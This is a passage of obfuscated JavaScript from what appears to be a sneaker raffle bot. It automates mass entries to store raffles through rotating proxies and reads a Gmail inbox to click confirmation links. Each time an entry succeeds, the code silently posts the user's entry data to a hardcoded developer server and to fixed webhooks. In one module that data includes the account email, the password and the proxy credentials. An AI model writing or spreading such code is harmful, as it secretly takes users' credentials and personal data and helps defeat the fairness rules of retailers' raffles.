                            console['log'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Logging\x20in'), await _0x31a524['waitForSelector']('#username'), await _0x31a524['type']('#username', _0x20e873[_0x276607]['Email']), await _0x31a524['waitForSelector']('#password'), await _0x31a524['type']('#password', _0x20e873[_0x276607]['Password']), await _0x4b01dc(0x190), await _0x31a524['click']('#buttonSubmit'), await _0x31a524['waitForSelector']('.b-variation_swatch-value_overlay'), console['log'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Getting\x20Product'), await _0x4b01dc(0x1f4), console['log'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x20e873[_0x276607]['Size']);
                            let _0x4865bd = _0x20e873[_0x276607]['Size']['replace']('.5', '\x201/2');
                            if (_0x4865bd['toUpperCase']() == 'RANDOM') {
                                const _0x12ee45 = await _0x31a524['$$']('.b-variations_item-content.m-list\x20>\x20button');
                                var _0x3816b7 = Math['round'](Math['random']() * (_0x12ee45['length'] - 0x1));
                                await _0x12ee45[_0x3816b7]['click']();
                            } else
                                await _0x31a524['click']('button[aria-label=\x22' + _0x4865bd + '\x22]');
                            await _0x4b01dc(0x1f4);
                            try {
                                await _0x31a524['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0x4b01dc(0x12c), console['log'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x31a524['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0x4b01dc(0x12c), await _0x31a524['type']('#dwfrm_raffle_addressFields_firstName', _0x20e873[_0x276607]['FirstName']), await _0x4b01dc(0x12c), await _0x31a524['type']('#dwfrm_raffle_addressFields_lastName', _0x20e873[_0x276607]['LastName']), await _0x4b01dc(0x12c), await _0x31a524['select']('#dwfrm_raffle_addressFields_country', _0x20e873[_0x276607]['Country']), await _0x4b01dc(0x12c), await _0x31a524['type']('#dwfrm_raffle_addressFields_city', _0x20e873[_0x276607]['City']), await _0x4b01dc(0x12c);
                            _0x20e873[_0x276607]['Postcode'] == undefined && (_0x20e873[_0x276607]['Postcode'] = _0x20e873[_0x276607]['Zip']);
                            await _0x31a524['type']('#dwfrm_raffle_addressFields_postalCode', _0x20e873[_0x276607]['Postcode']), await _0x4b01dc(0x12c), await _0x31a524['type']('#dwfrm_raffle_addressFields_address1', _0x20e873[_0x276607]['Address1']), await _0x4b01dc(0x12c), await _0x31a524['type']('#dwfrm_raffle_addressFields_address2', _0x20e873[_0x276607]['HouseNumber']), await _0x4b01dc(0x12c), await _0x31a524['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x20e873[_0x276607]['Address2']), await _0x4b01dc(0x12c), await _0x31a524['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0x4b01dc(0x12c), await _0x31a524['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x20e873[_0x276607]['Follower']), await _0x4b01dc(0x1f4), await _0x31a524['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0x4b01dc(0x1f4), console['log'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20' + _0xd12810['blue']('Awaiting\x20Paypal\x20Payment')), await _0x31a524['click']('.b-paypal_button');
                            try {
                                await _0x31a524['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x5d36e8 = 'no', _0x41d22(_0x20e873[_0x276607], _0x3da0b1), console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x339e3b['succesDEVMSG']);
                                await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x339e3b['succesDEVMSG']), await _0x4b01dc(0xc8), await _0x265172(_0x2c2f0f, _0x339e3b['succesPUBMSG']);
                                let _0x5f17e5 = _0x20e873[_0x276607];
                                try {
                                    prxdata = {
                                        'username': _0x4ebc10['replace']('#', ''),
                                        'module': _0x3da0b1['name'],
                                        'entrydata': JSON['stringify'](_0x5f17e5),
                                        'proxy': '' + _0x559e07[_0x276607]
                                    };
                                    var _0xe0cc5b = JSON['stringify'](prxdata);
                                    let _0x497bb8 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0xe0cc5b, _0x497bb8);
                                } catch (_0x954ff7) {
                                }
                            } catch (_0x4a154c) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4a154c)), _0x178cc0 = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4a154c;
                                var _0x35e95b = await _0x4a5b92(_0x20e873[_0x276607], _0x3da0b1, 'dev', !![], _0x178cc0);
                                _0x339e3b['errorDEV'] = { 'embeds': [_0x35e95b] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x339e3b['errorDEV']), await _0x265172(_0x3cc994, _0x339e3b['errorDEV']);
                            }
                        } catch (_0x58e597) {
                            console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20' + _0x58e597)), _0x178cc0 = '' + _0x58e597;
                            var _0x35e95b = await _0x4a5b92(_0x20e873[_0x276607], _0x3da0b1, 'dev', !![], _0x178cc0);
                            _0x339e3b['errorDEV'] = { 'embeds': [_0x35e95b] }, _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x339e3b['errorDEV']), await _0x265172(_0x3cc994, _0x339e3b['errorDEV']), _0x5d36e8 = 'yes';
                        } finally {
                            _0x4c5ca2 && _0x4c5ca2['close']();
                            if (_0x5d36e8 == 'yes' && _0x3e4e96 != 0x5) {
                                console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x3da0b1['name'] + ']\x20Task\x20' + (_0x276607 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3e4e96 + '\x20/\x205)')), _0x276607 = _0x276607 - 0x1, _0x3e4e96 = _0x3e4e96 + 0x1;
                                continue;
                            }
                            _0x5d36e8 == 'yes' && _0x3e4e96 >= 0x5 && (_0x2b505c(_0x20e873[_0x276607], _0x3da0b1), _0x5d36e8 = 'no', _0x3e4e96 = 0x0), console['log']('Waiting\x20for\x20' + _0x33c579['AfewDelay'] + '\x20ms'), await _0x4b01dc(_0x33c579['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'YqtGfh',
                            'custom_source': 'Air\x20Jordan\x204\x20Retro\x20Thunder\x20(2023)',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'Taryg7',
                                '$consent_form_version': 0x8bffa6,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x180df6, _0x1e3bc6, _0x229d16) {
                    for (var _0x13b634 = 0x0; _0x13b634 < _0x1e3bc6['length']; _0x13b634++) {
                        try {
                            await _0x32ecbd(_0x1e3bc6, _0x13b634);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x54f6ad(_0x59a55d, _0x29e982, _0x4cab67, _0x5c430e, _0x5be38b) {
                            var _0x31dfd2, _0x3a5b3d = {}, _0x1feb5e = [], _0x3ab561 = {}, _0x1e775e = [
                                '40',
                                '40.5',
                                '41',
                                '42',
                                '42.5',
                                '43',
                                '44',
                                '45',
                                '45.5',
                                '46',
                                '47',
                                '47.5',
                                '48'
                            ], _0x28df90 = Math['round'](Math['random']() * (_0x1e775e['length'] - 0x1));
                            !_0x5c430e && (_0x5c430e = {});
                            if (_0x29e982 != 'ver') {
                                _0x369d34(_0x4cab67['name'] + '\x20Task\x20' + (_0x59a55d + 0x1) + '\x20/\x20' + _0x5c430e['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f), await _0x32ecbd(_0x5c430e, _0x59a55d), _0x3a5b3d = _0x4cab67['data'], _0x3a5b3d['data']['attributes']['email'] = '' + _0x5c430e[_0x59a55d]['Email'];
                                if (_0x5c430e[_0x59a55d]['Size'] == 'RANDOM') {
                                }
                                _0x3a5b3d['data']['attributes']['properties']['$first_name'] = '' + _0x5c430e[_0x59a55d]['FirstName'], _0x3a5b3d['data']['attributes']['properties']['$last_name'] = '' + _0x5c430e[_0x59a55d]['LastName'], _0x3a5b3d['data']['attributes']['properties']['$address1'] = _0x5c430e[_0x59a55d]['Address1'] + '\x20' + _0x5c430e[_0x59a55d]['Address2'] + '\x20' + _0x5c430e[_0x59a55d]['HouseNumber'], _0x3a5b3d['data']['attributes']['properties']['$zip'] = '' + _0x5c430e[_0x59a55d]['Zip'], _0x3a5b3d['data']['attributes']['properties']['$city'] = '' + _0x5c430e[_0x59a55d]['City'], _0x3a5b3d['data']['attributes']['properties']['$country'] = '' + _0x5c430e[_0x59a55d]['Country'], _0x5c430e[_0x59a55d]['Size'] == 'RANDOM' ? _0x3a5b3d['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1e775e[_0x28df90] : _0x3a5b3d['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x5c430e[_0x59a55d]['Size'], _0x3a5b3d['data']['attributes']['properties']['$phone_number'] = '' + _0x5c430e[_0x59a55d]['Phone'], _0x3a5b3d['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x5c430e[_0x59a55d]['Follower'];
                            }
                            if (_0x33c579['useRandomProxy'] = ![])
                                var _0x35846a = _0x5be38b[_0x59a55d]['split'](':');
                            else
                                var _0x48171d = Math['round'](Math['random']() * (_0x5be38b['length'] - 0x1)), _0x35846a = _0x5be38b[_0x48171d]['split'](':');
                            var _0x31b041 = {
                                'jar': _0x9ac3a8,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x4cab67['url'],
                                'headers': _0x4cab67['headers'],
                                'body': JSON['stringify'](_0x3a5b3d),
                                'proxy': 'http://' + _0x35846a[0x2] + ':' + _0x35846a[0x3] + '@' + _0x35846a[0x0] + ':' + _0x35846a[0x1]
                            };
                            return _0x29e982 != 'ver' && (_0x31b041['url'] = _0x4cab67['url'], _0x31b041['headers'] = _0x4cab67['headers']), _0x29e982 == 'ver' && (_0x31b041['method'] = 'GET'), new Promise(function (_0x3676c0, _0x52a557) {
                                callback = async (_0x26689f, _0x7c815d, _0x8305d2) => {
                                    if (!_0x26689f && _0x7c815d['statusCode'] == 0xca || !_0x26689f && _0x7c815d['statusCode'] == 0xc8) {
                                        if (_0x29e982 != 'ver') {
                                            var _0x9166ff = await _0x4a5b92(_0x5c430e[_0x59a55d], _0x4cab67, 'dev', ![]), _0x5f1827 = await _0x4a5b92(_0x5c430e[_0x59a55d], _0x4cab67, 'pub', ![]);
                                            const _0x51864e = {
                                                'succesDEVMSG': { 'embeds': [_0x9166ff] },
                                                'succesPUBMSG': { 'embeds': [_0x5f1827] }
                                            };
                                            let _0xc7d285 = _0x5c430e[_0x59a55d];
                                            try {
                                                prxdata = {
                                                    'username': _0x4ebc10['replace']('#', ''),
                                                    'module': _0x4cab67['name'],
                                                    'entrydata': JSON['stringify'](_0xc7d285),
                                                    'proxy': '' + _0x5be38b[_0x59a55d]
                                                };
                                                var _0x118ec2 = JSON['stringify'](prxdata);
                                                let _0x264928 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x4f7750['post']('https://jraffles.herokuapp.com/success', _0x118ec2, _0x264928);
                                            } catch (_0x117ed7) {
                                            }
                                            if (_0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '')
                                                try {
                                                    await _0x265172(_0x33c579['webhook'], _0x51864e['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x51864e['succesDEVMSG']), await _0x4b01dc(0xc8);
                                            try {
                                                await _0x265172(_0x2c2f0f, _0x51864e['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x41d22(_0x5c430e[_0x59a55d], _0x4cab67);
                                        }
                                        _0x3676c0(console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x4cab67['name'] + ']\x20Task\x20' + (_0x59a55d + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x29e982 != 'ver') {
                                            var _0x168762 = '' + _0x26689f, _0x3258f7 = await _0x4a5b92(_0x5c430e[_0x59a55d], _0x4cab67, 'dev', !![], _0x168762), _0x2b3476 = {};
                                            _0x2b3476['errorDEV'] = { 'embeds': [_0x3258f7] }, _0x2b505c(_0x5c430e[_0x59a55d], _0x4cab67), _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x2b3476['errorDEV']), await _0x265172(_0x3cc994, _0x2b3476['errorDEV']);
                                        }
                                        _0x52a557(console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x4cab67['name'] + ']\x20Task\x20' + (_0x59a55d + 0x1) + ':\x20' + _0x26689f)));
                                    }
                                };
                                try {
                                    _0x29e982 != 'ver' && console['log'](_0x303e65() + '\x20[' + _0x4cab67['name'] + ']\x20Task\x20' + (_0x59a55d + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3a5b3d['data']['attributes']['email']), _0x67edce(_0x31b041, callback);
                                } catch (_0x120cc0) {
                                    console['log'](_0x303e65() + '\x20Task\x20' + (_0x59a55d + 0x1) + ':\x20' + _0x120cc0);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x54f6ad(_0x13b634, 'nor', _0x180df6, _0x1e3bc6, _0x229d16), console['log'](_0x303e65() + '\x20[' + _0x180df6['name'] + ']\x20Sleeping\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                        } catch (_0x5d162e) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x213769, _0x4cd0db, _0x527dad) {
                    var _0x2a99fb = [], _0x3a2894 = ![];
                    async function _0xd60039() {
                        var _0x4e6954 = new _0xc8c5aa({
                            'user': _0x33c579['masterMail'],
                            'password': _0x33c579['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x5011e7(_0x31e4c) {
                            _0x4e6954['openBox']('INBOX', ![], _0x31e4c);
                        }
                        _0x4e6954['once']('ready', function () {
                            _0x5011e7(function (_0x5b1bf9, _0x35397e) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5b1bf9)
                                    throw _0x5b1bf9;
                                _0x4e6954['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ]
                                ], function (_0x47e291, _0x2e4035) {
                                    if (!_0x2e4035 || !_0x2e4035['length'])
                                        console['log'](_0x303e65() + '\x20[' + _0x213769['name'] + ']\x20No\x20mails\x20found'), _0x4e6954['end']();
                                    else {
                                        var _0x23cc29 = _0x4e6954['seq']['fetch'](_0x2e4035, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x23cc29['on']('message', function (_0x5490ca, _0x21ed8a) {
                                            var _0x2073a5 = '(#' + _0x21ed8a + ')\x20';
                                            _0x5490ca['on']('body', function (_0xeb8fe6, _0x5880f0) {
                                                _0x1d4048(_0xeb8fe6, (_0x99f94f, _0x1fe94e) => {
                                                    var _0x55536d = _0x1fe94e['text']['split']('(')[0x1], _0x29c337 = _0x55536d['split'](')')[0x0];
                                                    _0x2a99fb['push'](_0x29c337);
                                                });
                                            }), _0x5490ca['once']('end', function () {
                                            });
                                        }), _0x23cc29['once']('error', function (_0x24c085) {
                                            console['log']('Fetch\x20error:\x20' + _0x24c085), _0x3a2894 = !![];
                                        }), _0x23cc29['once']('end', function () {
                                            _0x4e6954['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x4e6954['once']('error', function (_0x1c94bf) {
                            console['log'](_0xd12810['red'](_0x1c94bf['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3a2894 = !![];
                        }), _0x4e6954['once']('end', async function () {
                            _0x3a2894 = !![];
                        }), _0x4e6954['connect']();
                    }
                    async function _0x438239(_0x2a847e, _0x58c2de, _0x1e5844) {
                        for (var _0xc4d78 = 0x0; _0xc4d78 < _0x58c2de['length']; _0xc4d78++) {
                            async function _0x4125b5(_0x23d149, _0xbce8a1, _0x5309d7, _0x2884ab, _0x11ce89) {
                                var _0x437d5f, _0x1c118c = {}, _0x5287c9 = [], _0x55426b = {}, _0x33e4d9 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x42a8b5 = Math['round'](Math['random']() * (_0x33e4d9['length'] - 0x1));
                                _0x2884ab[_0x23d149]['Size'] == 'RANDOM' && (_0x2884ab[_0x23d149]['Size'] = _0x33e4d9[_0x42a8b5]);
                                !_0x2884ab && (_0x2884ab = {});
                                if (_0x33c579['useRandomProxy'] = ![])
                                    var _0x5d6273 = _0x11ce89[_0x23d149]['split'](':');
                                else
                                    var _0x534b9c = Math['round'](Math['random']() * (_0x11ce89['length'] - 0x1)), _0x5d6273 = _0x11ce89[_0x534b9c]['split'](':');
                                var _0xf0ae3f = {
                                    'jar': _0x9ac3a8,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x5309d7['url'],
                                    'headers': _0x5309d7['headers'],
                                    'body': JSON['stringify'](_0x1c118c),
                                    'proxy': 'http://' + _0x5d6273[0x2] + ':' + _0x5d6273[0x3] + '@' + _0x5d6273[0x0] + ':' + _0x5d6273[0x1]
                                };
                                return _0xbce8a1 != 'ver' && (_0xf0ae3f['url'] = _0x5309d7['url'], _0xf0ae3f['headers'] = _0x5309d7['headers']), _0xbce8a1 == 'ver' && (_0xf0ae3f['method'] = 'GET', _0xf0ae3f['url'] = _0x2884ab[_0x23d149]), new Promise(function (_0x267eab, _0x2e9c99) {
                                    callback = async (_0x1e3c40, _0x44f364, _0xb03d1a) => {
                                        if (!_0x1e3c40 && _0x44f364['statusCode'] == 0xca || !_0x1e3c40 && _0x44f364['statusCode'] == 0xc8) {
                                            if (_0xbce8a1 != 'ver') {
                                                var _0x41e014 = await _0x4a5b92(_0x2884ab[_0x23d149], _0x5309d7, 'dev', ![]), _0x266f95 = await _0x4a5b92(_0x2884ab[_0x23d149], _0x5309d7, 'pub', ![]);
                                                const _0x4f5b80 = {
                                                    'succesDEVMSG': { 'embeds': [_0x41e014] },
                                                    'succesPUBMSG': { 'embeds': [_0x266f95] }
                                                };
                                                if (_0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '')
                                                    try {
                                                        await _0x265172(_0x33c579['webhook'], _0x4f5b80['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4b01dc(0xc8), await _0x265172(_0x485a18, _0x4f5b80['succesDEVMSG']), await _0x4b01dc(0xc8);
                                                try {
                                                    await _0x265172(_0x2c2f0f, _0x4f5b80['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x41d22(_0x2884ab[_0x23d149], _0x5309d7);
                                            }
                                            _0x267eab(console['log'](_0xd12810['green'](_0x303e65() + '\x20[' + _0x5309d7['name'] + ']\x20Task\x20' + (_0x23d149 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0xbce8a1 != 'ver') {
                                                var _0xa5e78 = '' + _0x1e3c40, _0x2d8662 = await _0x4a5b92(_0x2884ab[_0x23d149], _0x5309d7, 'dev', !![], _0xa5e78), _0x387518 = {};
                                                _0x387518['errorDEV'] = { 'embeds': [_0x2d8662] }, _0x2b505c(_0x2884ab[_0x23d149], _0x5309d7), _0x33c579['webhook'] != undefined && _0x33c579['webhook'] != '' && await _0x265172(_0x33c579['webhook'], _0x387518['errorDEV']), await _0x265172(_0x3cc994, _0x387518['errorDEV']);
                                            }
                                            _0x2e9c99(console['log'](_0xd12810['red'](_0x303e65() + '\x20[' + _0x5309d7['name'] + ']\x20Task\x20' + (_0x23d149 + 0x1) + ':\x20' + _0x1e3c40)));
                                        }
                                    };
                                    try {
                                        _0xbce8a1 != 'ver' ? console['log'](_0x303e65() + '\x20[' + _0x5309d7['name'] + ']\x20Task\x20' + (_0x23d149 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1c118c['data']['attributes']['email']) : console['log'](_0x303e65() + '\x20[' + _0x5309d7['name'] + ']\x20Task\x20' + (_0x23d149 + 0x1) + ':\x20Fetching\x20Response'), _0x67edce(_0xf0ae3f, callback);
                                    } catch (_0x487cef) {
                                        console['log'](_0x303e65() + '\x20Task\x20' + (_0x23d149 + 0x1) + ':\x20' + _0x487cef);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4125b5(_0xc4d78, 'ver', _0x2a847e, _0x58c2de, _0x1e5844), console['log'](_0x303e65() + '\x20[' + _0x2a847e['name'] + ']\x20Sleeping\x20for\x20' + _0x33c579['delay'] + '\x20ms'), await _0x4b01dc(_0x33c579['delay']);
                            } catch (_0x5ca013) {
                            }
                        }
                    }
                    try {
                        _0xd60039();
                        while (!_0x3a2894) {
                            await _0x4b01dc(0xbb8);
                        }
                        console['log']('Found\x20' + _0x2a99fb['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4b01dc(0x9c4);
                    }
                    await _0x438239(_0x213769, _0x2a99fb, _0x527dad);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x4e49ba, _0x424a66, _0x2b8838) {
                    var _0x5005d5 = _0x424a66, _0x3b2201 = 0x0;
                    for (var _0x588a81 = 0x0; _0x588a81 < _0x424a66['length']; _0x588a81++) {
                        maxTasks = _0x33c579['threads'];
                        while (_0x3b2201 >= maxTasks) {
                            await _0x4b01dc(_0x33c579['delay']);
                        }
                        async function _0x4deb07(_0x3c0b3e, _0x2960c2, _0x4063a3, _0x17b8f8) {
                            try {
                                await _0x32ecbd(_0x2960c2, _0x17b8f8);
                            } catch (_0x2a61d5) {
                                throw new Error(_0x2a61d5);
                            }
                            async function _0x141bae(_0x1ed84a, _0x162038, _0x4397a2, _0x4d872d, _0x4bf0c7) {
                                _0x3b2201++;
                                var _0x4b97d6, _0x212795 = {}, _0xe4968e = [], _0x3eb858 = {}, _0x333848 = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x1d0fde = Math['round'](Math['random']() * (_0x333848['length'] - 0x1));
                                !_0x4d872d && (_0x4d872d = {});
                                if (_0x162038 != 'ver') {
                                    _0x369d34(_0x4397a2['name'] + '\x20Task\x20' + (_0x1ed84a + 0x1) + '\x20/\x20' + _0x4d872d['length'] + '\x20||\x20File:\x20' + _0x506019 + '\x20Proxies:\x20' + _0x15bf3f), _0xe4968e = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x4ebc10
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x4d872d[_0x1ed84a]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x33c579['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x5ddf1c
                                            }
                                        ]
                                    }], _0x3eb858 = { 'embeds': _0xe4968e }, _0x212795 = _0x4397a2['data'], _0x212795['data']['attributes']['email'] = '' + _0x4d872d[_0x1ed84a]['Email'];
